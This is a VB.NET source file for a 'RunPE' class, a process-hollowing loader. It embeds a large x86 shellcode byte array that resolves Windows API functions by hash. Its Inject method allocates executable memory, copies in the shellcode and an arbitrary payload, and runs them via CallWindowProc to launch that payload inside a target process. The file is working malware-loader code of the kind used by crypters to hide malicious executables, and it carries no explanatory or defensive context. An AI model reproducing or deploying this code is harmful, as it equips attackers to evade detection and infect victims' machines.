Imports System.Runtime.InteropServices
Public Class RunPE
    Private Shared shellcodeBytes() As Byte = {96, 232, 78, 0, 0, 0, 107, 0, 101, 0, 114, 0, 110, 0, 101, 0, 108, 0, 51, 0, 50, 0, 0, 0, 110, 0, 116, 0, 100, 0, 108, 0, 108, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 91, 139, 252, 106, 66, 232, 187, 3, 0, 0, 139, 84, 36, 40, 137, 17, 139, 84,
        36, 44, 106, 62, 232, 170, 3, 0, 0, 137, 17, 106, 74, 232, 161, 3, 0, 0, 137, 57, 106, 30, 106, 60, 232, 157, 3, 0, 0, 106, 34, 104, 244, 0, 0, 0, 232, 145, 3, 0, 0, 106, 38, 106, 36, 232, 136,
        3, 0, 0, 106, 42, 106, 64, 232, 127, 3, 0, 0, 106, 46, 106, 12, 232, 118, 3, 0, 0, 106, 50, 104, 200, 0, 0, 0, 232, 106, 3, 0, 0, 106, 42, 232, 92, 3, 0, 0, 139, 9, 199, 1, 68, 0, 0, 0, 106, 18,
        232, 77, 3, 0, 0, 104, 91, 232, 20, 207, 81, 232, 121, 3, 0, 0, 106, 62, 232, 59, 3, 0, 0, 139, 209, 106, 30, 232, 50, 3, 0, 0, 106, 64, 255, 50, 255, 49, 255, 208, 106, 18, 232, 35, 3, 0, 0, 104,
        91, 232, 20, 207, 81, 232, 79, 3, 0, 0, 106, 30, 232, 17, 3, 0, 0, 139, 9, 139, 81, 60, 106, 62, 232, 5, 3, 0, 0, 139, 57, 3, 250, 106, 34, 232, 250, 2, 0, 0, 139, 9, 104, 248, 0, 0, 0, 87, 81, 255,
        208, 106, 0, 232, 232, 2, 0, 0, 104, 136, 254, 179, 22, 81, 232, 20, 3, 0, 0, 106, 46, 232, 214, 2, 0, 0, 139, 57, 106, 42, 232, 205, 2, 0, 0, 139, 17, 106, 66, 232, 196, 2, 0, 0, 87, 82, 106, 0, 106,
        0, 106, 4, 106, 0, 106, 0, 106, 0, 106, 0, 255, 49, 255, 208, 106, 18, 232, 169, 2, 0, 0, 104, 208, 55, 16, 242, 81, 232, 213, 2, 0, 0, 106, 34, 232, 151, 2, 0, 0, 139, 17, 106, 46, 232, 142, 2, 0, 0, 139,
        9, 255, 114, 52, 255, 49, 255, 208, 106, 0, 232, 126, 2, 0, 0, 104, 156, 149, 26, 110, 81, 232, 170, 2, 0, 0, 106, 34, 232, 108, 2, 0, 0, 139, 17, 139, 57, 106, 46, 232, 97, 2, 0, 0, 139, 9, 106, 64, 104, 0,
        48, 0, 0, 255, 114, 80, 255, 119, 52, 255, 49, 255, 208, 106, 54, 232, 71, 2, 0, 0, 139, 209, 106, 34, 232, 62, 2, 0, 0, 139, 57, 106, 62, 232, 53, 2, 0, 0, 139, 49, 106, 34, 232, 44, 2, 0, 0, 139, 1, 106, 46,
        232, 35, 2, 0, 0, 139, 9, 82, 255, 119, 84, 86, 255, 112, 52, 255, 49, 106, 0, 232, 16, 2, 0, 0, 104, 161, 106, 61, 216, 81, 232, 60, 2, 0, 0, 131, 196, 12, 255, 208, 106, 18, 232, 249, 1, 0, 0, 104, 91, 232,
        20, 207, 81, 232, 37, 2, 0, 0, 106, 34, 232, 231, 1, 0, 0, 139, 17, 131, 194, 6, 106, 58, 232, 219, 1, 0, 0, 106, 2, 82, 81, 255, 208, 106, 54, 232, 206, 1, 0, 0, 199, 1, 0, 0, 0, 0, 184, 40, 0, 0, 0, 106,
        54, 232, 188, 1, 0, 0, 247, 33, 106, 30, 232, 179, 1, 0, 0, 139, 17, 139, 82, 60, 129, 194, 248, 0, 0, 0, 3, 208, 106, 62, 232, 159, 1, 0, 0, 3, 17, 106, 38, 232, 150, 1, 0, 0, 106, 40, 82, 255, 49,
         106, 18, 232, 138, 1, 0, 0, 104, 91, 232, 20, 207, 81, 232, 182, 1, 0, 0, 131, 196, 12, 255, 208, 106, 38, 232, 115, 1, 0, 0, 139, 57, 139, 9, 139, 113, 20, 106, 62, 232, 101, 1, 0, 0, 3, 49, 106,
         38, 232, 92, 1, 0, 0, 139, 9, 139, 81, 12, 106, 34, 232, 80, 1, 0, 0, 139, 9, 3, 81, 52, 106, 70, 232, 68, 1, 0, 0, 139, 193, 106, 46, 232, 59, 1, 0, 0, 139, 9, 80, 255, 119, 16, 86, 82, 255, 49,
         106, 0, 232, 42, 1, 0, 0, 104, 161, 106, 61, 216, 81, 232, 86, 1, 0, 0, 131, 196, 12, 255, 208, 106, 54, 232, 19, 1, 0, 0, 139, 17, 131, 194, 1, 137, 17, 106, 58, 232, 5, 1, 0, 0, 139, 9, 59, 202,
         15, 133, 51, 255, 255, 255, 106, 50, 232, 244, 0, 0, 0, 139, 9, 199, 1, 7, 0, 1, 0, 106, 0, 232, 229, 0, 0, 0, 104, 210, 199, 167, 104, 81, 232, 17, 1, 0, 0, 106, 50, 232, 211, 0, 0, 0, 139, 17, 106,
         46, 232, 202, 0, 0, 0, 139, 9, 82, 255, 113, 4, 255, 208, 106, 34, 232, 187, 0, 0, 0, 139, 57, 131, 199, 52, 106, 50, 232, 175, 0, 0, 0, 139, 49, 139, 182, 164, 0, 0, 0, 131, 198, 8, 106, 46, 232, 157,
         0, 0, 0, 139, 17, 106, 70, 232, 148, 0, 0, 0, 81, 106, 4, 87, 86, 255, 50, 106, 0, 232, 134, 0, 0, 0, 104, 161, 106, 61, 216, 81, 232, 178, 0, 0, 0, 131, 196, 12, 255, 208, 106, 34, 232, 111, 0, 0, 0, 139,
         9, 139, 81, 40, 3, 81, 52, 106, 50, 232, 96, 0, 0, 0, 139, 9, 129, 193, 176, 0, 0, 0, 137, 17, 106, 0, 232, 79, 0, 0, 0, 104, 211, 199, 167, 232, 81, 232, 123, 0, 0, 0, 106, 50, 232, 61, 0, 0, 0, 139, 209,
         106, 46, 232, 52, 0, 0, 0, 139, 9, 255, 50, 255, 113, 4, 255, 208, 106, 0, 232, 36, 0, 0, 0, 104, 136, 63, 74, 158, 81, 232, 80, 0, 0, 0, 106, 46, 232, 18, 0, 0, 0, 139, 9, 255, 113, 4, 255, 208, 106, 74,
         232, 4, 0, 0, 0, 139, 33, 97, 195, 139, 203, 3, 76, 36, 4, 195, 106, 0, 232, 242, 255, 255, 255, 104, 84, 202, 175, 145, 81, 232, 30, 0, 0, 0, 106, 64, 104, 0, 16, 0, 0, 255, 116, 36, 24, 106, 0, 255, 208,
         255, 116, 36, 20, 232, 207, 255, 255, 255, 137, 1, 131, 196, 16, 195, 232, 34, 0, 0, 0, 104, 164, 78, 14, 236, 80, 232, 75, 0, 0, 0, 131, 196, 8, 255, 116, 36, 4, 255, 208, 255, 116, 36, 8, 80, 232, 56, 0,
         0, 0, 131, 196, 8, 195, 85, 82, 81, 83, 86, 87, 51, 192, 100, 139, 112, 48, 139, 118, 12, 139, 118, 28, 139, 110, 8, 139, 126, 32, 139, 54, 56, 71, 24, 117, 243, 128, 63, 107, 116, 7, 128, 63, 75, 116, 2, 235,
         231, 139, 197, 95, 94, 91, 89, 90, 93, 195, 85, 82, 81, 83, 86, 87, 139, 108, 36, 28, 133, 237, 116, 67, 139, 69, 60, 139, 84, 40, 120, 3, 213, 139, 74, 24, 139, 90, 32, 3, 221, 227, 48, 73, 139, 52, 139, 3, 245,
         51, 255, 51, 192, 252, 172, 132, 192, 116, 7, 193, 207, 13, 3, 248, 235, 244, 59, 124, 36, 32, 117, 225, 139, 90, 36, 3, 221, 102, 139, 12, 75, 139, 90, 28, 3, 221, 139, 4, 139, 3, 197, 95, 94, 91, 89, 90, 93, 195, 195, 0, 0, 0, 0}
    <DllImport("user32.dll")> Public Shared Function CallWindowProc(lpPrevWndFunc As IntPtr, hWnd As IntPtr, Msg As IntPtr, wParam As Integer, lParam As Integer) As Integer
    End Function
    <DllImport("kernel32")> Private Shared Function VirtualAlloc(lpStartAddr As UInt32, size As UInt32, flAllocationType As UInt32, flProtect As UInt32) As UInt32
    End Function
    Private Shared MEM_COMMIT As UInt32 = &H1000
    Private Shared PAGE_EXECUTE_READWRITE As UInt32 = &H40

    Public Shared Sub Inject(ByVal data() As Byte, ByVal injectPath As String)
        Dim injectPath_ptr As IntPtr = Marshal.StringToHGlobalUni(injectPath)
        Dim shellcodeAlloc_ptr As IntPtr = VirtualAlloc(0, Convert.ToInt32(shellcodeBytes.Length), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
        Dim dataAlloc_ptr As IntPtr = VirtualAlloc(0, Convert.ToInt32(data.Length), MEM_COMMIT, PAGE_EXECUTE_READWRITE)

        Marshal.Copy(shellcodeBytes, 0, shellcodeAlloc_ptr, shellcodeBytes.Length)
        Marshal.Copy(data, 0, dataAlloc_ptr, data.Length)

        CallWindowProc(shellcodeAlloc_ptr, injectPath_ptr, dataAlloc_ptr, 0, 0)
    End Sub
End Class
